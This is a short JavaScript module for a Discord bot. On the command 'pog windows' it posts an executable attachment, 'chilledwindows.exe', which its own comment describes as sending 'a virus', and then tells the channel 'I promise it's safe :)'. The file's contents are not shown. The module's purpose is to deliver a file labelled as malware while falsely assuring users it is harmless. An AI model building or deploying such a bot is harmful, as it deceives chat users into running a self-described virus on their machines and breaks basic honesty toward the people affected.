module.exports = {
    checkWindows: function(receivedMessage) {
    const {MessageAttachment} = require('discord.js')
    const chilledwindows = new MessageAttachment('chilledwindows.exe') // creates windows installer message attachment
    let fullCommand = receivedMessage.content.substr(4) // Remove the leading pog
    let splitCommand = fullCommand.split(" ") // Split the message up in to pieces for each space
    let primaryCommand = splitCommand[0] // The first word directly after "pog" is the command
    found = false

        switch(primaryCommand.toLowerCase()) { // called when messages says 'pog windows'
            case 'windows' :
                receivedMessage.channel.send(chilledwindows) // sends a virus
                receivedMessage.channel.send("I promise it's safe :)") // informs the user that the program is safe
        }
        // value of 'found' will be returned in bot.js
        return found
    }
}